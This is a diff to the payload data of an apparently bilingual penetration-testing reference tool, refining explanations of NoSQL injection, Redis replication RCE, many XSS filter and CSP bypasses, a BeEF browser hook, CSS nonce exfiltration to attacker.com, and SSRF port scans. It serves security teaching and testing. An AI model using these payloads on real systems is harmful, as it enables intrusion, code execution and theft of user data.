@@ -884,8 +884,10 @@ export const webPayloads: PayloadItem[] = [
         title: { zh: '6. 盲注提取数据', en: '6. Blind InjectionExtract Data' }, 
         command: '{"username": {"$regex": "^a"}}\n{"username": {"$regex": "^ad"}}\n{"username": {"$regex": "^adm"}}\n逐字符枚举用户名',
             syntaxBreakdown: [
-              { part: '{"username":', explanation: { zh: '命令/载荷起始', en: 'Command/PayloadStart' }, type: 'command' },
-              { part: ' {"$regex": "^a"}}\n{"username": {"$regex": "^ad"}}\n{"username": {"$regex": "^adm"}}\n逐字符枚举用户名', explanation: { zh: '参数与载荷内容', en: 'Parameter and PayloadContent' }, type: 'value' }
+              { part: '"$regex"', explanation: { zh: 'MongoDB正则查询操作符，此处被注入用于盲注', en: 'MongoDB regex operator abused for blind injection' }, type: 'parameter' },
+              { part: '{"username": {"$regex": "^a"}}', explanation: { zh: '探测用户名是否以a开头，依据响应差异判断正误', en: 'Probe whether username starts with a via response difference' }, type: 'value' },
+              { part: '{"username": {"$regex": "^ad"}}', explanation: { zh: '前缀扩展为ad，逐字符逼近真实用户名', en: 'Extend prefix to ad, approaching real username char by char' }, type: 'value' },
+              { part: '{"username": {"$regex": "^adm"}}', explanation: { zh: '前缀扩展为adm，继续盲注枚举', en: 'Extend prefix to adm to continue blind enumeration' }, type: 'value' },
             ],
         description: { zh: '使用正则逐字符提取', en: 'Extract character by character using regex' }, 
         },
@@ -995,9 +997,10 @@ redis-cli -h target.com info`,
 python redis-rogue-server.py --rhost target.com --lhost attacker.com
 通过主从复制加载恶意模块执行命令`,
             syntaxBreakdown: [
-              { part: '使用redis-rogue-server工具:', explanation: { zh: '第1步操作', en: 'Step 1 operation' }, type: 'command' },
-              { part: 'python redis-rogue-server.py --rhost target.com --lhost attacker.com', explanation: { zh: '第2步操作', en: 'Step 2 operation' }, type: 'value' },
-              { part: '通过主从复制加载恶意模块执行命令', explanation: { zh: '第3步操作', en: 'Step 3 operation' }, type: 'value' }
+              { part: 'python redis-rogue-server.py', explanation: { zh: '以Python运行redis-rogue-server主从复制攻击脚本', en: 'Run redis-rogue-server attack script with Python' }, type: 'command' },
+              { part: '--rhost target.com', explanation: { zh: '指定受害Redis目标主机', en: 'Victim Redis host' }, type: 'parameter' },
+              { part: '--lhost attacker.com', explanation: { zh: '指定攻击者(伪装为主节点)的监听地址', en: 'Attacker host acting as malicious master' }, type: 'parameter' },
+              { part: '主从复制加载恶意模块执行命令', explanation: { zh: '利用Redis主从复制机制向目标推送恶意so模块实现RCE', en: 'Load malicious module via master-slave replication for RCE' }, type: 'technique' },
             ],
         description: { zh: '主从复制RCE', en: 'Master-slave replication RCE' }, 
         platform: 'linux',
@@ -1751,11 +1754,9 @@ UNION
         title: { zh: '双写绕过', en: 'Double-write bypass' }, 
         command: '<scr<script>ipt>alert(1)</scr</script>ipt>\n<imimgg src=x onerror=alert(1)>',
             syntaxBreakdown: [
-              { part: '<scr<script>', explanation: { zh: 'HTML标签/事件处理器', en: 'HTMLtag/EventprocessingTool' }, type: 'tag' },
-              { part: 'ipt>alert(1)', explanation: { zh: '注入代码', en: 'InjectionCode' }, type: 'value' },
-              { part: '</scr</script>', explanation: { zh: 'HTML标签/事件处理器', en: 'HTMLtag/EventprocessingTool' }, type: 'tag' },
-              { part: 'ipt>\n', explanation: { zh: '注入代码', en: 'InjectionCode' }, type: 'value' },
-              { part: '<imimgg src=x onerror=alert(1)>', explanation: { zh: 'HTML标签/事件处理器', en: 'HTMLtag/EventprocessingTool' }, type: 'tag' }
+              { part: '<scr<script>ipt>', explanation: { zh: '双写嵌套script标签：内层<script>被过滤删除后，剩余字符重新拼出完整标签', en: 'Nested script tags reassemble after inner tag is stripped' }, type: 'tag' },
+              { part: 'alert(1)</scr</script>ipt>', explanation: { zh: '弹窗代码与双写的闭合标签，过滤后还原为</script>', en: 'Alert code and doubled closing tag' }, type: 'value' },
+              { part: '<imimgg src=x onerror=alert(1)>', explanation: { zh: 'img双写变体：删除内层img后拼出<img>标签并由onerror触发', en: 'Doubled img tag reassembles and fires onerror' }, type: 'tag' },
             ],
         description: { zh: '双写绕过关键字删除', en: 'Double-write bypass for keyword removal' }, 
         platform: 'all'
@@ -1764,14 +1765,9 @@ UNION
         title: { zh: '注释混淆', en: 'CommentObfuscation' }, 
         command: '<script>/**/alert(1)/**/</script>\n<img src=x/**/onerror=alert(1)>\n<svg on<!--test-->load=alert(1)>',
             syntaxBreakdown: [
-              { part: '<script>', explanation: { zh: 'HTML标签/事件处理器', en: 'HTMLtag/EventprocessingTool' }, type: 'tag' },
-              { part: '/**/alert(1)/**/', explanation: { zh: '注入代码', en: 'InjectionCode' }, type: 'value' },
-              { part: '</script>', explanation: { zh: 'HTML标签/事件处理器', en: 'HTMLtag/EventprocessingTool' }, type: 'tag' },
-              { part: '\n', explanation: { zh: '注入代码', en: 'InjectionCode' }, type: 'value' },
-              { part: '<img src=x/**/onerror=alert(1)>', explanation: { zh: 'HTML标签/事件处理器', en: 'HTMLtag/EventprocessingTool' }, type: 'tag' },
-              { part: '\n', explanation: { zh: '注入代码', en: 'InjectionCode' }, type: 'value' },
-              { part: '<svg on<!--test-->', explanation: { zh: 'HTML标签/事件处理器', en: 'HTMLtag/EventprocessingTool' }, type: 'tag' },
-              { part: 'load=alert(1)>', explanation: { zh: '注入代码', en: 'InjectionCode' }, type: 'value' }
+              { part: '<script>/**/alert(1)/**/</script>', explanation: { zh: 'script内用/**/注释分隔alert，绕过连续关键字匹配', en: 'Comments interleaved with alert to evade keyword matching' }, type: 'value' },
+              { part: '<img src=x/**/onerror=alert(1)>', explanation: { zh: 'img标签：注释插入在属性与事件之间打乱特征', en: 'Comment inserted between attribute and event handler' }, type: 'tag' },
+              { part: '<svg on<!--test-->load=alert(1)>', explanation: { zh: 'svg标签：注释拆分onload事件名绕过检测', en: 'Comment splitting onload event name' }, type: 'tag' },
             ],
         description: { zh: '使用注释混淆', en: 'UseCommentObfuscation' }, 
         platform: 'all'
@@ -1798,15 +1794,10 @@ UNION
         title: { zh: '1. 探测存储点', en: '1. Detectstoragepoint' }, 
         command: '在评论区、用户名、个人简介等处输入:\n<script>alert(1)</script>\n"><script>alert(1)</script>\n测试是否存储并执行',
             syntaxBreakdown: [
-              { part: '在评论区、用户名、个人简介等处输入:\n', explanation: { zh: '注入代码', en: 'InjectionCode' }, type: 'value' },
-              { part: '<script>', explanation: { zh: 'HTML标签/事件处理器', en: 'HTMLtag/EventprocessingTool' }, type: 'tag' },
-              { part: 'alert(1)', explanation: { zh: '注入代码', en: 'InjectionCode' }, type: 'value' },
-              { part: '</script>', explanation: { zh: 'HTML标签/事件处理器', en: 'HTMLtag/EventprocessingTool' }, type: 'tag' },
-              { part: '\n">', explanation: { zh: '注入代码', en: 'InjectionCode' }, type: 'value' },
-              { part: '<script>', explanation: { zh: 'HTML标签/事件处理器', en: 'HTMLtag/EventprocessingTool' }, type: 'tag' },
-              { part: 'alert(1)', explanation: { zh: '注入代码', en: 'InjectionCode' }, type: 'value' },
-              { part: '</script>', explanation: { zh: 'HTML标签/事件处理器', en: 'HTMLtag/EventprocessingTool' }, type: 'tag' },
-              { part: '\n测试是否存储并执行', explanation: { zh: '注入代码', en: 'InjectionCode' }, type: 'value' }
+              { part: '在评论区、用户名、个人简介等处输入', explanation: { zh: '注入点选择：这些位置的输入会被存储并回显', en: 'Injection points: fields that get stored and echoed' }, type: 'concept' },
+              { part: '<script>alert(1)</script>', explanation: { zh: '标准弹窗载荷，验证输入被原样存储', en: 'Standard payload to test if input is stored verbatim' }, type: 'value' },
+              { part: '"><script>alert(1)</script>', explanation: { zh: '先闭合HTML属性再注入脚本的变体', en: 'Variant closing the HTML attribute before injection' }, type: 'value' },
+              { part: '测试是否存储并执行', explanation: { zh: '验证步骤：重新访问页面确认脚本被执行', en: 'Verify execution by revisiting the page' }, type: 'concept' },
             ],
         description: { zh: '探测存储型XSS', en: 'DetectStored XSS' }, 
         platform: 'all'
@@ -1835,12 +1826,10 @@ UNION
         title: '4. BeEF Hook', 
         command: '<script src="http://beef-server:3000/hook.js"></script>\n或:\n<script>\nvar s=document.createElement("script");\ns.src="http://beef-server:3000/hook.js";\ndocument.body.appendChild(s);\n</script>',
             syntaxBreakdown: [
-              { part: '<script src="http://beef-server:3000/hook.js">', explanation: { zh: 'HTML标签/事件处理器', en: 'HTMLtag/EventprocessingTool' }, type: 'tag' },
-              { part: '</script>', explanation: { zh: 'HTML标签/事件处理器', en: 'HTMLtag/EventprocessingTool' }, type: 'tag' },
-              { part: '\n或:\n', explanation: { zh: '注入代码', en: 'InjectionCode' }, type: 'value' },
-              { part: '<script>', explanation: { zh: 'HTML标签/事件处理器', en: 'HTMLtag/EventprocessingTool' }, type: 'tag' },
-              { part: '\nvar s=document.createElement("script");\ns.src="http://beef-server:3000/hook.js";\ndocument.body.appendChild(s);\n', explanation: { zh: '注入代码', en: 'InjectionCode' }, type: 'value' },
-              { part: '</script>', explanation: { zh: 'HTML标签/事件处理器', en: 'HTMLtag/EventprocessingTool' }, type: 'tag' }
+              { part: '<script src="http://beef-server:3000/hook.js"></script>', explanation: { zh: '方式一：直接引用BeEF的hook.js勾住浏览器', en: 'Direct reference to BeEF hook.js' }, type: 'value' },
+              { part: 'var s=document.createElement("script");', explanation: { zh: '方式二：动态创建script元素', en: 'Dynamically create a script element' }, type: 'command' },
+              { part: 's.src="http://beef-server:3000/hook.js";', explanation: { zh: '将元素src指向BeEF勾子脚本', en: 'Point src at the BeEF hook script' }, type: 'value' },
+              { part: 'document.body.appendChild(s);', explanation: { zh: '挂载到DOM触发加载执行', en: 'Attach to DOM to trigger loading' }, type: 'function' },
             ],
         description: { zh: '使用BeEF框架控制浏览器', en: 'Use BeEF framework to control browsers' }, 
         },
@@ -1850,17 +1839,9 @@ UNION
         title: { zh: 'SVG标签绕过', en: 'SVGtagBypass' }, 
         command: '<svg><script>alert(1)</script></svg>\n<svg><animate onbegin=alert(1)>\n<svg><set onbegin=alert(1)>',
             syntaxBreakdown: [
-              { part: '<svg>', explanation: { zh: 'HTML标签/事件处理器', en: 'HTMLtag/EventprocessingTool' }, type: 'tag' },
-              { part: '<script>', explanation: { zh: 'HTML标签/事件处理器', en: 'HTMLtag/EventprocessingTool' }, type: 'tag' },
-              { part: 'alert(1)', explanation: { zh: '注入代码', en: 'InjectionCode' }, type: 'value' },
-              { part: '</script>', explanation: { zh: 'HTML标签/事件处理器', en: 'HTMLtag/EventprocessingTool' }, type: 'tag' },
-              { part: '</svg>', explanation: { zh: 'HTML标签/事件处理器', en: 'HTMLtag/EventprocessingTool' }, type: 'tag' },
-              { part: '\n', explanation: { zh: '注入代码', en: 'InjectionCode' }, type: 'value' },
-              { part: '<svg>', explanation: { zh: 'HTML标签/事件处理器', en: 'HTMLtag/EventprocessingTool' }, type: 'tag' },
-              { part: '<animate onbegin=alert(1)>', explanation: { zh: 'HTML标签/事件处理器', en: 'HTMLtag/EventprocessingTool' }, type: 'tag' },
-              { part: '\n', explanation: { zh: '注入代码', en: 'InjectionCode' }, type: 'value' },
-              { part: '<svg>', explanation: { zh: 'HTML标签/事件处理器', en: 'HTMLtag/EventprocessingTool' }, type: 'tag' },
-              { part: '<set onbegin=alert(1)>', explanation: { zh: 'HTML标签/事件处理器', en: 'HTMLtag/EventprocessingTool' }, type: 'tag' }
+              { part: '<svg><script>alert(1)</script></svg>', explanation: { zh: 'SVG命名空间内嵌script：HTML实体编码语境外的执行向量', en: 'Script inside SVG namespace bypasses HTML entity context' }, type: 'value' },
+              { part: '<svg><animate onbegin=alert(1)>', explanation: { zh: 'SVG animate标签的onbegin事件在动画开始时触发', en: 'SVG animate onbegin event fires at animation start' }, type: 'tag' },
+              { part: '<svg><set onbegin=alert(1)>', explanation: { zh: 'SVG set标签的onbegin事件触发弹窗', en: 'SVG set onbegin event triggers alert' }, type: 'tag' },
             ],
         description: { zh: '使用SVG标签绕过', en: 'UseSVGtagBypass' }, 
         platform: 'all'
@@ -1869,11 +1850,10 @@ UNION
         title: { zh: 'Math标签绕过', en: 'MathtagBypass' }, 
         command: '<math><maction actiontype="statusline#http://attacker.com" xlink:href="javascript:alert(1)">click</maction></math>',
             syntaxBreakdown: [
-              { part: '<math>', explanation: { zh: 'HTML标签/事件处理器', en: 'HTMLtag/EventprocessingTool' }, type: 'tag' },
-              { part: '<maction actiontype="statusline#http://attacker.com" xlink:href="javascript:alert(1)">', explanation: { zh: 'HTML标签/事件处理器', en: 'HTMLtag/EventprocessingTool' }, type: 'tag' },
-              { part: 'click', explanation: { zh: '注入代码', en: 'InjectionCode' }, type: 'value' },
-              { part: '</maction>', explanation: { zh: 'HTML标签/事件处理器', en: 'HTMLtag/EventprocessingTool' }, type: 'tag' },
-              { part: '</math>', explanation: { zh: 'HTML标签/事件处理器', en: 'HTMLtag/EventprocessingTool' }, type: 'tag' }
+              { part: '<math><maction', explanation: { zh: 'MathML动作标签，旧版浏览器支持其交互属性', en: 'MathML action tag supported by legacy browsers' }, type: 'tag' },
+              { part: 'actiontype="statusline#http://attacker.com"', explanation: { zh: '动作类型指向状态栏并夹带外链', en: 'Action type pointing to status bar with embedded URL' }, type: 'parameter' },
+              { part: 'xlink:href="javascript:alert(1)"', explanation: { zh: 'xlink伪协议在点击时执行JS', en: 'javascript pseudo-protocol via xlink:href' }, type: 'value' },
+              { part: 'click</maction></math>', explanation: { zh: '点击文本触发上述动作', en: 'Clicking the text triggers the action' }, type: 'value' },
             ],
         description: { zh: '使用MathML标签', en: 'UseMathMLtag' }, 
         platform: 'all'
@@ -1930,9 +1910,9 @@ $(location.hash)`,
 如果页面有: document.write(location.hash)
 则触发XSS`,
             syntaxBreakdown: [
-              { part: 'URL: http://target.com/#', explanation: { zh: '注入代码', en: 'InjectionCode' }, type: 'value' },
-              { part: '<img src=x onerror=alert(1)>', explanation: { zh: 'HTML标签/事件处理器', en: 'HTMLtag/EventprocessingTool' }, type: 'tag' },
-              { part: '\n如果页面有: document.write(location.hash)\n则触发XSS', explanation: { zh: '注入代码', en: 'InjectionCode' }, type: 'value' }
+              { part: 'http://target.com/#', explanation: { zh: '目标URL的fragment(#)部分，不会被发送到服务器', en: 'URL fragment is never sent to the server' }, type: 'domain' },
+              { part: '<img src=x onerror=alert(1)>', explanation: { zh: '置于hash中的img事件载荷', en: 'IMG payload placed in the hash' }, type: 'tag' },
+              { part: 'document.write(location.hash)', explanation: { zh: '缺陷代码：将hash未经净化直接写入DOM导致XSS', en: 'Vulnerable code writes hash into DOM unsanitized' }, type: 'function' },
             ],
         description: { zh: '利用location.hash', en: 'Exploitationlocation.hash' },
         platform: 'all',
@@ -1963,10 +1943,11 @@ jaVaScRiPt:alert(1)
 &#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;:alert(1)
 <a href="&#x6A;&#x61;&#x76;&#x61;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;:alert(1)">click</a>`,
             syntaxBreakdown: [
-              { part: 'javascript:alert(1)\njavascript	:alert(1)\njaVaScRiPt:alert(1)\n&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;:alert(1)\n', explanation: { zh: '注入代码', en: 'InjectionCode' }, type: 'value' },
-              { part: '<a href="&#x6A;&#x61;&#x76;&#x61;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;:alert(1)">', explanation: { zh: 'HTML标签/事件处理器', en: 'HTMLtag/EventprocessingTool' }, type: 'tag' },
-              { part: 'click', explanation: { zh: '注入代码', en: 'InjectionCode' }, type: 'value' },
-              { part: '</a>', explanation: { zh: 'HTML标签/事件处理器', en: 'HTMLtag/EventprocessingTool' }, type: 'tag' }
+              { part: 'javascript:alert(1)', explanation: { zh: '标准伪协议执行形式', en: 'Standard pseudo-protocol form' }, type: 'value' },
+              { part: 'javascript	:alert(1)', explanation: { zh: '协议名与冒号间插入Tab字符绕过过滤', en: 'Tab inserted between protocol and colon' }, type: 'value' },
+              { part: 'jaVaScRiPt:alert(1)', explanation: { zh: '大小写混写绕过大小写敏感的黑名单', en: 'Mixed case evades case-sensitive blacklist' }, type: 'value' },
+              { part: '&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;', explanation: { zh: '十进制HTML实体编码的javascript:伪协议', en: 'Decimal HTML entities encoding javascript:' }, type: 'encoding' },
+              { part: '&#x6A;&#x61;&#x76;&#x61;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;', explanation: { zh: '十六进制实体编码的javascript字符串，放入a标签href触发', en: 'Hex entities for javascript in an anchor href' }, type: 'encoding' },
             ],
         description: { zh: '使用大小写混淆、HTML实体编码、制表符插入等方式绕过javascript:协议过滤', en: 'Bypass javascript: protocol filtering using case obfuscation, HTML entity encoding, tab character insertion, and similar techniques' },
       },
@@ -1979,21 +1960,13 @@ jaVaScRiPt:alert(1)
 <body onpageshow=alert(1)>
 <input onfocus=alert(1) autofocus>`,
             syntaxBreakdown: [
-              { part: '<svg onload=alert(1)>', explanation: { zh: 'HTML标签/事件处理器', en: 'HTMLtag/EventprocessingTool' }, type: 'tag' },
-              { part: '<svg/onload=alert(1)>', explanation: { zh: 'HTML标签/事件处理器', en: 'HTMLtag/EventprocessingTool' }, type: 'tag' },
-              { part: '<math>', explanation: { zh: 'HTML标签/事件处理器', en: 'HTMLtag/EventprocessingTool' }, type: 'tag' },
-              { part: '<mtext>', explanation: { zh: 'HTML标签/事件处理器', en: 'HTMLtag/EventprocessingTool' }, type: 'tag' },
-              { part: '<table>', explanation: { zh: 'HTML标签/事件处理器', en: 'HTMLtag/EventprocessingTool' }, type: 'tag' },
-              { part: '<mglyph>', explanation: { zh: 'HTML标签/事件处理器', en: 'HTMLtag/EventprocessingTool' }, type: 'tag' },
-              { part: '<svg>', explanation: { zh: 'HTML标签/事件处理器', en: 'HTMLtag/EventprocessingTool' }, type: 'tag' },
-              { part: '<mtext>', explanation: { zh: 'HTML标签/事件处理器', en: 'HTMLtag/EventprocessingTool' }, type: 'tag' },
-              { part: '<textarea>', explanation: { zh: 'HTML标签/事件处理器', en: 'HTMLtag/EventprocessingTool' }, type: 'tag' },
-              { part: '<path id="</textarea>', explanation: { zh: 'HTML标签/事件处理器', en: 'HTMLtag/EventprocessingTool' }, type: 'tag' },
-              { part: '<img onerror=alert(1) src=1>', explanation: { zh: 'HTML标签/事件处理器', en: 'HTMLtag/EventprocessingTool' }, type: 'tag' },
-              { part: '">\n', explanation: { zh: '注入代码', en: 'InjectionCode' }, type: 'value' },
-              { part: '<details open ontoggle=alert(1)>', explanation: { zh: 'HTML标签/事件处理器', en: 'HTMLtag/EventprocessingTool' }, type: 'tag' },
-              { part: '<body onpageshow=alert(1)>', explanation: { zh: 'HTML标签/事件处理器', en: 'HTMLtag/EventprocessingTool' }, type: 'tag' },
-              { part: '<input onfocus=alert(1) autofocus>', explanation: { zh: 'HTML标签/事件处理器', en: 'HTMLtag/EventprocessingTool' }, type: 'tag' }
+              { part: '<svg onload=alert(1)>', explanation: { zh: 'svg标签onload事件直接触发', en: 'SVG onload fires immediately' }, type: 'tag' },
+              { part: '<svg/onload=alert(1)>', explanation: { zh: '用斜杠代替空格分隔标签与属性，绕过空格过滤', en: 'Slash replaces space between tag and attribute' }, type: 'tag' },
+              { part: '<math><mtext><table><mglyph><svg><mtext><textarea><path id="</textarea>', explanation: { zh: 'MathML/SVG/textarea多层嵌套制造解析差异，是mXSS核心结构', en: 'Nested MathML/SVG elements create mXSS parsing differential' }, type: 'tag' },
+              { part: '<img onerror=alert(1) src=1>', explanation: { zh: '在逃逸出的HTML上下文中注入img事件载荷', en: 'IMG payload in the escaped HTML context' }, type: 'tag' },
+              { part: '<details open ontoggle=alert(1)>', explanation: { zh: 'details默认展开触发ontoggle事件', en: 'details with open attribute triggers ontoggle' }, type: 'tag' },
+              { part: '<body onpageshow=alert(1)>', explanation: { zh: 'body页面显示事件触发', en: 'body onpageshow event' }, type: 'tag' },
+              { part: '<input onfocus=alert(1) autofocus>', explanation: { zh: 'autofocus自动聚焦触发onfocus', en: 'autofocus triggers onfocus' }, type: 'tag' },
             ],
         description: { zh: '利用SVG、MathML等非标准HTML标签及冷门事件处理器(ontoggle、onpageshow)绕过标签和事件黑名单', en: 'Bypass tag and event blacklists using non-standard HTML tags like SVG and MathML, along with obscure event handlers (ontoggle, onpageshow)' },
       },
@@ -2032,11 +2005,8 @@ Content-Security-Policy: default-src 'self'; script-src 'self' https://cdn.examp
 <script>alert(1)</script>
 可以直接执行内联脚本`,
             syntaxBreakdown: [
-              { part: '如果CSP包含unsafe-inline:\n', explanation: { zh: '注入代码', en: 'InjectionCode' }, type: 'value' },
-              { part: '<script>', explanation: { zh: 'HTML标签/事件处理器', en: 'HTMLtag/EventprocessingTool' }, type: 'tag' },
-              { part: 'alert(1)', explanation: { zh: '注入代码', en: 'InjectionCode' }, type: 'value' },
-              { part: '</script>', explanation: { zh: 'HTML标签/事件处理器', en: 'HTMLtag/EventprocessingTool' }, type: 'tag' },
-              { part: '\n可以直接执行内联脚本', explanation: { zh: '注入代码', en: 'InjectionCode' }, type: 'value' }
+              { part: 'unsafe-inline', explanation: { zh: 'CSP包含unsafe-inline时允许执行内联脚本', en: 'unsafe-inline permits inline scripts' }, type: 'value' },
+              { part: '<script>alert(1)</script>', explanation: { zh: '内联脚本可直接执行弹窗验证', en: 'Inline script executes directly' }, type: 'value' },
             ],
         description: { zh: '利用unsafe-inline配置', en: 'Exploitationunsafe-inlineConfiguration' },
         platform: 'all',
@@ -2048,14 +2018,9 @@ Content-Security-Policy: default-src 'self'; script-src 'self' https://cdn.examp
 <script>setTimeout("alert(1)", 0)</script>
 可以使用eval等函数`,
             syntaxBreakdown: [
-              { part: '如果CSP包含unsafe-eval:\n', explanation: { zh: '注入代码', en: 'InjectionCode' }, type: 'value' },
-              { part: '<script>', explanation: { zh: 'HTML标签/事件处理器', en: 'HTMLtag/EventprocessingTool' }, type: 'tag' },
-              { part: 'eval("alert(1)")', explanation: { zh: '注入代码', en: 'InjectionCode' }, type: 'value' },
-              { part: '</script>', explanation: { zh: 'HTML标签/事件处理器', en: 'HTMLtag/EventprocessingTool' }, type: 'tag' },
-              { part: '<script>', explanation: { zh: 'HTML标签/事件处理器', en: 'HTMLtag/EventprocessingTool' }, type: 'tag' },
-              { part: 'setTimeout("alert(1)", 0)', explanation: { zh: '注入代码', en: 'InjectionCode' }, type: 'value' },
-              { part: '</script>', explanation: { zh: 'HTML标签/事件处理器', en: 'HTMLtag/EventprocessingTool' }, type: 'tag' },
-              { part: '\n可以使用eval等函数', explanation: { zh: '注入代码', en: 'InjectionCode' }, type: 'value' }
+              { part: 'unsafe-eval', explanation: { zh: 'CSP包含unsafe-eval时允许eval类动态执行', en: 'unsafe-eval permits dynamic evaluation' }, type: 'value' },
+              { part: 'eval("alert(1)")', explanation: { zh: 'eval动态执行字符串代码', en: 'eval executes string as code' }, type: 'function' },
+              { part: 'setTimeout("alert(1)", 0)', explanation: { zh: 'setTimeout以字符串形式延迟执行代码', en: 'setTimeout executes string argument' }, type: 'function' },
             ],
         description: { zh: '利用unsafe-eval配置', en: 'Exploitationunsafe-evalConfiguration' },
         platform: 'all',
@@ -2103,14 +2068,11 @@ Content-Security-Policy: default-src 'self'; script-src 'self' https://cdn.examp
 <script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.6.1/angular.min.js"></script>
 <div ng-app ng-csp>{{$eval.constructor("alert(1)")()}}</div>`,
             syntaxBreakdown: [
-              { part: '# 寻找白名单域上的JSONP端点:\n', explanation: { zh: '注入代码', en: 'InjectionCode' }, type: 'value' },
-              { part: '<script src="https://accounts.google.com/o/oauth2/revoke?callback=alert(1)">', explanation: { zh: 'HTML标签/事件处理器', en: 'HTMLtag/EventprocessingTool' }, type: 'tag' },
-              { part: '</script>', explanation: { zh: 'HTML标签/事件处理器', en: 'HTMLtag/EventprocessingTool' }, type: 'tag' },
-              { part: '<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.6.1/angular.min.js">', explanation: { zh: 'HTML标签/事件处理器', en: 'HTMLtag/EventprocessingTool' }, type: 'tag' },
-              { part: '</script>', explanation: { zh: 'HTML标签/事件处理器', en: 'HTMLtag/EventprocessingTool' }, type: 'tag' },
-              { part: '<div ng-app ng-csp>', explanation: { zh: 'HTML标签/事件处理器', en: 'HTMLtag/EventprocessingTool' }, type: 'tag' },
-              { part: '{{$eval.constructor("alert(1)")()}}', explanation: { zh: '注入代码', en: 'InjectionCode' }, type: 'value' },
-              { part: '</div>', explanation: { zh: 'HTML标签/事件处理器', en: 'HTMLtag/EventprocessingTool' }, type: 'tag' }
+              { part: 'https://accounts.google.com/o/oauth2/revoke', explanation: { zh: 'Google白名单域上的接口，其JSONP行为可被利用', en: 'Whitelisted Google endpoint with abusable JSONP' }, type: 'domain' },
+              { part: 'callback=alert(1)', explanation: { zh: 'callback参数控制JSONP回调执行的JS', en: 'callback parameter controls executed JS' }, type: 'parameter' },
+              { part: 'https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.6.1/angular.min.js', explanation: { zh: '从白名单CDN加载AngularJS为沙箱逃逸做准备', en: 'Load AngularJS from whitelisted CDN' }, type: 'domain' },
+              { part: 'ng-app ng-csp', explanation: { zh: 'Angular指令：声明应用并启用CSP兼容模式', en: 'Angular directives enabling CSP mode' }, type: 'parameter' },
+              { part: '{{$eval.constructor("alert(1)")()}', explanation: { zh: 'Angular表达式沙箱逃逸：借构造器直接执行弹窗', en: 'Angular sandbox escape via constructor' }, type: 'value' },
             ],
         description: { zh: '利用CSP白名单域上的JSONP回调端点或AngularJS库执行任意JavaScript，无需unsafe-inline', en: 'Execute arbitrary JavaScript via JSONP callback endpoints or AngularJS libraries on CSP-whitelisted domains, without requiring unsafe-inline' },
       },
@@ -2125,13 +2087,10 @@ Content-Security-Policy: default-src 'self'; script-src 'self' https://cdn.examp
 <style>script[nonce^="a"]{background:url(http://attacker.com/?n=a)}</style>
 # 或通过DOM读取: document.querySelector("script[nonce]").nonce`,
             syntaxBreakdown: [
-              { part: '# base-uri未限制时:\n', explanation: { zh: '注入代码', en: 'InjectionCode' }, type: 'value' },
-              { part: '<base href="http://attacker.com/">', explanation: { zh: 'HTML标签/事件处理器', en: 'HTMLtag/EventprocessingTool' }, type: 'tag' },
-              { part: '\n# 页面中相对路径的脚本将从attacker.com加载\n\n# nonce泄露利用:\n# 通过CSS注入窃取nonce:\n', explanation: { zh: '注入代码', en: 'InjectionCode' }, type: 'value' },
-              { part: '<style>', explanation: { zh: 'HTML标签/事件处理器', en: 'HTMLtag/EventprocessingTool' }, type: 'tag' },
-              { part: 'script[nonce^="a"]{background:url(http://attacker.com/?n=a)}', explanation: { zh: '注入代码', en: 'InjectionCode' }, type: 'value' },
-              { part: '</style>', explanation: { zh: 'HTML标签/事件处理器', en: 'HTMLtag/EventprocessingTool' }, type: 'tag' },
-              { part: '\n# 或通过DOM读取: document.querySelector("script[nonce]").nonce', explanation: { zh: '注入代码', en: 'InjectionCode' }, type: 'value' }
+              { part: '<base href="http://attacker.com/">', explanation: { zh: 'base标签劫持相对路径解析，脚本将从攻击者域加载', en: 'base tag hijacks relative URL resolution' }, type: 'tag' },
+              { part: 'script[nonce^="a"]', explanation: { zh: 'CSS属性选择器匹配nonce前缀字符', en: 'CSS selector matches nonce prefix' }, type: 'value' },
+              { part: 'background:url(http://attacker.com/?n=a)', explanation: { zh: '选择器命中时通过背景图请求外带nonce', en: 'Exfiltrate nonce via background URL' }, type: 'value' },
+              { part: 'document.querySelector("script[nonce]").nonce', explanation: { zh: 'DOM方式直接读取script标签的nonce属性', en: 'Read nonce attribute directly from DOM' }, type: 'function' },
             ],
         description: { zh: '利用CSP未限制base-uri指令劫持脚本加载源，或通过CSS注入/DOM接口泄露script nonce值', en: 'Hijack script loading sources by exploiting unrestricted base-uri in CSP, or leak script nonce values through CSS injection/DOM interfaces' },
       },
@@ -2168,7 +2127,11 @@ Content-Security-Policy: default-src 'self'; script-src 'self' https://cdn.examp
         title: { zh: '2. 扫描内网端口', en: '2. ScanInternal networkPort' }, 
         command: 'http://192.168.1.1:22\nhttp://192.168.1.1:80\nhttp://192.168.1.1:443\nhttp://192.168.1.1:3306\n根据响应差异判断端口开放状态',
             syntaxBreakdown: [
-              { part: 'http://192.168.1.1:22\nhttp://192.168.1.1:80\nhttp://192.168.1.1:443\nhttp://192', explanation: { zh: '攻击载荷', en: 'AttackPayload' }, type: 'value' }
+              { part: 'http://192.168.1.1:22', explanation: { zh: '探测内网主机22端口(SSH服务)', en: 'Probe internal port 22 (SSH)' }, type: 'domain' },
+              { part: 'http://192.168.1.1:80', explanation: { zh: '探测80端口(HTTP服务)', en: 'Probe port 80 (HTTP)' }, type: 'domain' },
+              { part: 'http://192.168.1.1:443', explanation: { zh: '探测443端口(HTTPS服务)', en: 'Probe port 443 (HTTPS)' }, type: 'domain' },
+              { part: 'http://192.168.1.1:3306', explanation: { zh: '探测3306端口(MySQL服务)', en: 'Probe port 3306 (MySQL)' }, type: 'domain' },
+              { part: '根据响应差异判断端口开放状态', explanation: { zh: '依据响应时间与错误信息差异判断端口是否开放', en: 'Infer port state from response differences' }, type: 'concept' },
             ],
         description: { zh: '扫描内网端口', en: 'ScanInternal networkPort' }, 
         platform: 'all'
@@ -2177,7 +2140,9 @@ Content-Security-Policy: default-src 'self'; script-src 'self' https://cdn.examp
         title: { zh: '3. 访问内网服务', en: '3. AccessInternal networkService' }, 
         command: 'http://192.168.1.100/admin\nhttp://10.0.0.1:8080/manager\nhttp://172.16.0.1:9200/_cat/indices\n访问内网管理界面或敏感服务',
             syntaxBreakdown: [
